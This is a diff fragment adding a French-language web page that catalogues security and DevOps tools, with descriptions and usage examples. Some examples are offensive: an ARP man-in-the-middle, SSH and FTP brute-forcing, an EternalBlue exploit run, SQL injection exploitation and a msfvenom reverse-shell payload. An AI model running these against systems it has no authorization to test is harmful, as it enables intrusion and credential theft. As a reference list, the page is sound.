+sudo tcpdump -i any port 80 -A
+sudo tcpdump host 192.168.1.1 and port 443`},
+  {name:`Ettercap`,cat:`Network`,status:`ok`,desc:`Suite pour les attaques Man-in-the-Middle. Empoisonnement ARP, sniffing SSL.`,example:`sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
+sudo ettercap -G`},
+  {name:`Zenmap`,cat:`Network`,status:`ok`,desc:`Interface graphique officielle de Nmap. Visualisation des topologies réseau.`,example:`zenmap
+nmap -A -T4 192.168.1.0/24`},
+  {name:`NetworkMiner`,cat:`Network`,status:`ok`,desc:`Analyseur forensics réseau passif. Reconstruit les fichiers depuis des captures pcap.`,example:`networkminer capture.pcap`},
+  {name:`Autopsy`,cat:`Forensics`,status:`ok`,desc:`Plateforme d'investigation numérique. Analyse de disques, récupération de fichiers supprimés.`,example:`autopsy
+# Interface web sur http://localhost:9999
+# Créer un cas > ajouter une image disque`},
+  {name:`Binwalk`,cat:`Forensics`,status:`ok`,desc:`Analyse et extraction de firmware. Détecte les systèmes de fichiers embarqués.`,example:`binwalk firmware.bin
+binwalk -e firmware.bin
+binwalk -M -e firmware.bin`},
+  {name:`ExifTool`,cat:`Forensics`,status:`ok`,desc:`Lecture et modification des métadonnées de fichiers. Supporte 200+ formats.`,example:`exiftool image.jpg
+exiftool -GPS* photo.jpg
+exiftool -all= image.jpg`},
+  {name:`Foremost`,cat:`Forensics`,status:`ok`,desc:`Récupération de fichiers par signature (file carving).`,example:`sudo foremost -i /dev/sdb -o /output/
+foremost -t jpg,pdf -i disk.img -o recovered/`},
+  {name:`Scalpel`,cat:`Forensics`,status:`ok`,desc:`Carving de fichiers haute performance, successeur de Foremost.`,example:`scalpel -o output/ disk.img`},
+  {name:`Testdisk`,cat:`Forensics`,status:`ok`,desc:`Récupération de partitions et systèmes de fichiers corrompus.`,example:`sudo testdisk /dev/sdb
+# Analyze > Quick Search`},
+  {name:`Volatility3`,cat:`Forensics`,status:`ok`,desc:`Analyse forensics de mémoire vive. Extraction de processus depuis des dumps RAM.`,example:`python3 -m volatility3 -f mem.dmp windows.pslist
+volatility3 -f mem.dmp linux.bash`},
+  {name:`CeWL`,cat:`Password`,status:`ok`,desc:`Générateur de wordlists par spider d'un site web.`,example:`cewl https://target.com -d 2 -m 6 -w wordlist.txt`},
+  {name:`Crunch`,cat:`Password`,status:`ok`,desc:`Générateur de wordlists par pattern et charset.`,example:`crunch 8 8 abcdef123 -o wordlist.txt
+crunch 6 8 -t @@@@%% -o pass.txt`},
+  {name:`Hashcat`,cat:`Password`,status:`ok`,desc:`Cracking de hashes accéléré par GPU. Supporte 300+ algorithmes.`,example:`hashcat -m 0 hashes.txt rockyou.txt
+hashcat -m 22000 wpa.hc22000 wordlist.txt`},
+  {name:`Hydra`,cat:`Password`,status:`ok`,desc:`Brute-force de services réseau. SSH, FTP, HTTP et 50+ protocoles.`,example:`hydra -l admin -P rockyou.txt ssh://192.168.1.1
+hydra -L users.txt -P pass.txt ftp://192.168.1.1`},
+  {name:`John the Ripper`,cat:`Password`,status:`ok`,desc:`Cracking de mots de passe multi-formats. Auto-détection du format de hash.`,example:`john --wordlist=rockyou.txt hashes.txt
+john --show hashes.txt`},
+  {name:`Medusa`,cat:`Password`,status:`ok`,desc:`Brute-force parallèle de services réseau. Multi-thread pour la rapidité.`,example:`medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh`},
+  {name:`Ghidra`,cat:`Reverse`,status:`ok`,desc:`Suite de reverse engineering de la NSA. Décompilation et analyse statique.`,example:`ghidra
+# File > New Project > Import File
+# CodeBrowser pour le décompilé`},
+  {name:`Cutter`,cat:`Reverse`,status:`ok`,desc:`Interface graphique moderne pour Radare2. Débogage et graphes de flux.`,example:`cutter binary
+# Décompilateur: View > Decompiler`},
+  {name:`Radare2`,cat:`Reverse`,status:`ok`,desc:`Framework d'analyse binaire en ligne de commande.`,example:`r2 -A binary
+[0x0]> afl
+[0x0]> pdf @ main
+[0x0]> VV`},
+  {name:`GDB`,cat:`Reverse`,status:`ok`,desc:`Débogueur GNU standard. Inspection mémoire, points d'arrêt.`,example:`gdb ./binary
+(gdb) break main
+(gdb) run
+(gdb) x/20x $rsp`},
+  {name:`Strings`,cat:`Reverse`,status:`ok`,desc:`Extraction de chaînes imprimables depuis un binaire.`,example:`strings binary | grep -i password
+strings -n 8 binary`},
+  {name:`Burp Suite`,cat:`Web`,status:`warn`,desc:`Proxy d'intercept pour les tests de sécurité web. Scanner, fuzzer, repeater.`,example:`burpsuite
+# Configurer proxy browser: 127.0.0.1:8080`},
+  {name:`OWASP ZAP`,cat:`Web`,status:`warn`,desc:`Scanner de vulnérabilités web open-source. Scan actif/passif, spider, fuzzer.`,example:`zaproxy
+# Automated Scan: entrer l URL cible`},
+  {name:`Nikto`,cat:`Web`,status:`ok`,desc:`Scanner de serveurs web. Configurations dangereuses, fichiers exposés.`,example:`nikto -h https://target.com
+nikto -h 192.168.1.1 -port 8080`},
+  {name:`SQLMap`,cat:`Web`,status:`ok`,desc:`Détection et exploitation automatisée des injections SQL.`,example:`sqlmap -u http://target.com/page?id=1 --dbs
+sqlmap -r request.txt --level=5 --risk=3`},
+  {name:`Dirb`,cat:`Web`,status:`ok`,desc:`Brute-force de répertoires et fichiers web par dictionnaire.`,example:`dirb https://target.com /usr/share/dirb/wordlists/common.txt`},
+  {name:`Gobuster`,cat:`Web`,status:`ok`,desc:`Énumération de répertoires, sous-domaines et vhosts. Multi-threading.`,example:`gobuster dir -u https://target.com -w common.txt
+gobuster dns -d target.com -w subdomains.txt`},
+  {name:`WPScan`,cat:`Web`,status:`ok`,desc:`Scanner dédié WordPress. Plugins, thèmes, utilisateurs, vulnérabilités.`,example:`wpscan --url https://target.com
+wpscan --url https://target.com -e u,p,t`},
+  {name:`CyberChef`,cat:`Web`,status:`ok`,desc:`Couteau suisse pour l'encodage/décodage et l'analyse de données.`,example:`# Ouvre https://gchq.github.io/CyberChef/
+# Recettes: From Base64 > Magic`},
+  {name:`Metasploit`,cat:`Exploitation`,status:`ok`,desc:`Framework d'exploitation modulaire. 2000+ exploits et payloads.`,example:`msfconsole
+msf> search eternalblue
+msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> set RHOSTS 192.168.1.1
+msf> run`},
+  {name:`Msfvenom`,cat:`Exploitation`,status:`ok`,desc:`Générateur de payloads Metasploit. Shellcodes et exécutables.`,example:`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf`},
+  {name:`SearchSploit`,cat:`Exploitation`,status:`ok`,desc:`Recherche locale dans la base Exploit-DB.`,example:`searchsploit apache 2.4
+searchsploit --cve 2021-44228`},
+  {name:`BeEF`,cat:`Exploitation`,status:`ok`,desc:`Framework d'exploitation de navigateurs web via Docker.`,example:`sudo docker run -p 3000:3000 beefproject/beef
+# Panel: http://localhost:3000/ui/panel`},
+  {name:`theHarvester`,cat:`OSINT`,status:`ok`,desc:`Collecte d'emails, sous-domaines, IPs depuis des sources publiques.`,example:`theharvester -d target.com -b google -l 100
+theharvester -d target.com -b all`},
+  {name:`Recon-ng`,cat:`OSINT`,status:`ok`,desc:`Framework OSINT modulaire. Modules pour domaines, personnes, entreprises.`,example:`recon-ng
+[recon-ng]> marketplace install all
+[recon-ng]> workspaces create target`},
+  {name:`Shodan CLI`,cat:`OSINT`,status:`ok`,desc:`Interface CLI pour Shodan. Trouve les appareils connectés et serveurs exposés.`,example:`shodan search apache 2.4 --fields ip_str,port
+shodan host 192.168.1.1`},
+  {name:`Spiderfoot`,cat:`OSINT`,status:`ok`,desc:`Automatisation OSINT complète. 200+ modules et interface web.`,example:`spiderfoot -l 127.0.0.1:5001
+# Interface web: http://127.0.0.1:5001`},
+  {name:`Maltego`,cat:`OSINT`,status:`warn`,desc:`Visualisation de liens OSINT sous forme de graphes interactifs.`,example:`maltego
+# Glisser entité Domain > Run Transform`},
+  {name:`GnuPG`,cat:`Crypto`,status:`ok`,desc:`Chiffrement et signature numérique OpenPGP.`,example:`gpg --gen-key
+gpg --encrypt --recipient user@mail.com fichier.txt
+gpg --decrypt fichier.txt.gpg`},
+  {name:`OpenSSL`,cat:`Crypto`,status:`ok`,desc:`Boîte à outils SSL/TLS et cryptographie générale.`,example:`openssl s_client -connect target.com:443
+openssl enc -aes-256-cbc -in file.txt -out file.enc`},
+  {name:`Steghide`,cat:`Crypto`,status:`ok`,desc:`Stéganographie pour images JPEG et fichiers audio.`,example:`steghide embed -cf image.jpg -sf secret.txt -p motdepasse
+steghide extract -sf image.jpg -p motdepasse`},
+  {name:`Zsteg`,cat:`Crypto`,status:`ok`,desc:`Détection de stéganographie LSB dans les fichiers PNG et BMP.`,example:`zsteg image.png
+zsteg -a image.png`},
+  {name:`AnonSurf`,cat:`Anonymat`,status:`ok`,desc:`Routage de tout le trafic système via Tor. Désactive IPv6, configure iptables. CLI wrapper installé automatiquement.`,example:`sudo anonsurf start
+sudo anonsurf stop
+sudo anonsurf status
+sudo anonsurf myip
+sudo anonsurf changeid`},
+  {name:`Proxychains4`,cat:`Anonymat`,status:`ok`,desc:`Force n'importe quelle application à passer par Tor ou un proxy SOCKS.`,example:`proxychains4 nmap -sT 192.168.1.1
+proxychains4 curl https://target.com`},
+  {name:`Tor Browser`,cat:`Anonymat`,status:`ok`,desc:`Navigateur Firefox modifié pour la navigation anonyme via Tor.`,example:`torbrowser-launcher
+# Bridges obfs4 si Tor est bloqué`},
+  {name:`Docker`,cat:`DevOps`,status:`ok`,desc:`Plateforme de conteneurisation. Exécution d'applications isolées dans des conteneurs légers.`,example:`docker run -it ubuntu bash
+docker ps -a
+docker compose up -d`},
+  {name:`Ansible`,cat:`DevOps`,status:`ok`,desc:`Automatisation de configuration et déploiement. Infrastructure as Code sans agent.`,example:`ansible-playbook -i hosts playbook.yml
+ansible all -m ping
+ansible-lint playbook.yml`},
+  {name:`Podman`,cat:`DevOps`,status:`ok`,desc:`Alternative à Docker sans daemon. Compatible OCI, rootless par défaut.`,example:`podman run -it fedora bash
+podman build -t myapp .
+podman pod create --name webapp`},
+  {name:`kubectl`,cat:`DevOps`,status:`ok`,desc:`CLI officiel Kubernetes. Gestion de clusters, pods, services et déploiements.`,example:`kubectl get pods -A
+kubectl apply -f deployment.yml
+kubectl logs -f pod-name`},
+  {name:`Minikube`,cat:`DevOps`,status:`ok`,desc:`Cluster Kubernetes local pour le développement et les tests.`,example:`minikube start
+minikube dashboard
+minikube delete`},
+  {name:`Lazydocker`,cat:`DevOps`,status:`ok`,desc:`Interface TUI pour Docker. Visualisation des conteneurs, images, volumes et logs.`,example:`lazydocker`},
+  {name:`Ollama`,cat:`IA`,status:`ok`,desc:`Exécution de LLM en local. Supporte Llama 3, Mistral, CodeLlama et d'autres modèles open source.`,example:`ollama run llama3
+ollama list
+ollama pull mistral
+ollama serve`},
+  {name:`Claude Code`,cat:`IA`,status:`ok`,desc:`CLI officiel Anthropic pour Claude. Assistance IA en ligne de commande pour le développement.`,example:`claude
+claude "explique ce code"
+claude --model sonnet`},
+  {name:`Open WebUI`,cat:`IA`,status:`ok`,desc:`Interface web pour Ollama. Chat avec les modèles locaux via un navigateur.`,example:`docker run -d -p 3000:8080 \\
+  --add-host=host.docker.internal:host-gateway \\
+  -v open-webui:/app/backend/data \\
+  --name open-webui \\
+  ghcr.io/open-webui/open-webui:main`},
+  {name:`Restic`,cat:`Backup`,status:`ok`,desc:`Sauvegarde chiffrée et dédupliquée. Supporte local, SFTP, S3 et autres backends.`,example:`restic init --repo /backup
+restic backup ~/documents
+restic snapshots
+restic restore latest --target /restore`},
+  {name:`BorgBackup`,cat:`Backup`,status:`ok`,desc:`Sauvegarde dédupliquée avec compression. Efficace pour les sauvegardes incrémentales.`,example:`borg init --encryption=repokey /backup
+borg create /backup::daily ~/documents
+borg list /backup`},
+  {name:`Rclone`,cat:`Backup`,status:`ok`,desc:`Synchronisation de fichiers vers le cloud. Supporte 70+ fournisseurs (S3, GDrive, OneDrive…).`,example:`rclone config
+rclone sync ~/docs remote:backup
+rclone ls remote:bucket`},
+  {name:`Timeshift`,cat:`Backup`,status:`ok`,desc:`Snapshots système type Time Machine. Restauration rapide via btrfs ou rsync.`,example:`sudo timeshift --create --comments "avant mise à jour"
+sudo timeshift --list
+sudo timeshift --restore`},
+];
+
+const CAT_COLORS = {Network:"#5b7fa6",Forensics:"#5a9e82",Password:"#c49a3a",Reverse:"#7b6fc4",Web:"#b85c7a",Exploitation:"#c05555",OSINT:"#4a7ab5",Crypto:"#6a9930",Anonymat:"#7a7a7a",DevOps:"#3a8f9f",IA:"#9b59b6",Backup:"#2e86ab"};
+const CATS = ["Network","Forensics","Password","Reverse","Web","Exploitation","OSINT","Crypto","Anonymat","DevOps","IA","Backup"];
+
+let activeFilter = "Tous";
+let expanded = new Set();
+
+function render() {
+  const q = document.getElementById("search").value.toLowerCase();
+  const filtered = TOOLS.filter(t =>
+    (activeFilter === "Tous" || t.cat === activeFilter) &&
+    (!q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q))
+  );
+  document.getElementById("hcount").textContent = filtered.length + " outils";
+  document.getElementById("stats").innerHTML = [
+    {n:TOOLS.length,l:"Total"},
+    {n:TOOLS.filter(t=>t.status==="ok").length,l:"Installés"},
+    {n:TOOLS.filter(t=>t.status!=="ok").length,l:"À installer"},
+    {n:CATS.length,l:"Catégories"}
+  ].map(s=>`<div class="stat"><div class="stat-n">${s.n}</div><div class="stat-l">${s.l}</div></div>`).join("");
+
+  document.getElementById("sidebar").innerHTML =
+    `<button class="cat-btn ${activeFilter==="Tous"?"active":""}" onclick="setFilter('Tous')">
+      <span class="cat-dot" style="background:var(--accent)"></span>
+      <span class="cat-label">Tous</span>
+      <span class="cat-count">${TOOLS.length}</span>
+    </button>` +
+    CATS.map(c => {
+      const n = TOOLS.filter(t=>t.cat===c).length;
+      return `<button class="cat-btn ${activeFilter===c?"active":""}" onclick="setFilter('${c}')">
+        <span class="cat-dot" style="background:${CAT_COLORS[c]}"></span>
+        <span class="cat-label">${c}</span>
+        <span class="cat-count">${n}</span>
+      </button>`;
+    }).join("");
+
+  const contentEl = document.getElementById("content");
+  if (!filtered.length) {
+    contentEl.innerHTML = `<div class="no-results">Aucun outil trouvé pour votre recherche.</div>`;
+    return;
+  }
+
+  contentEl.innerHTML = CATS.map(cat => {
+    const tools = filtered.filter(t=>t.cat===cat);
+    if (!tools.length) return "";
+    return `<div class="cat-section">
+      <div class="cat-header">
+        <span class="cat-dot" style="background:${CAT_COLORS[cat]};width:10px;height:10px;box-shadow:2px 2px 5px rgba(0,0,0,0.2)"></span>
+        <span class="cat-name">${cat}</span>
+        <span class="cat-badge">${tools.length} outil${tools.length>1?"s":""}</span>
+      </div>
+      <div class="tools-grid">
+        ${tools.map(t => `
+          <div class="tool-card ${expanded.has(t.name)?"open":""}" onclick="toggle('${t.name}')">
+            <div class="tool-top">
+              <span class="tool-dot2" style="background:${CAT_COLORS[t.cat]}"></span>
+              <span class="tool-name">${t.name}</span>
+              <span class="tool-badge ${t.status==="ok"?"badge-ok":"badge-warn"}">${t.status==="ok"?"Installé":"À installer"}</span>
+              <span class="tool-arrow">&#9658;</span>
+            </div>
+            <div class="tool-body">
+              <div class="tool-divider"></div>
+              <p class="tool-desc">${t.desc}</p>
+              <div class="example-label">Exemple d usage</div>
+              <div class="example-code">${t.example}</div>
+            </div>
+          </div>
+        `).join("")}
+      </div>
+    </div>`;
+  }).join("");
+}
+
+function setFilter(cat) { activeFilter = cat; render(); }
+function toggle(name) { expanded.has(name) ? expanded.delete(name) : expanded.add(name); render(); }
+render();
+</script>
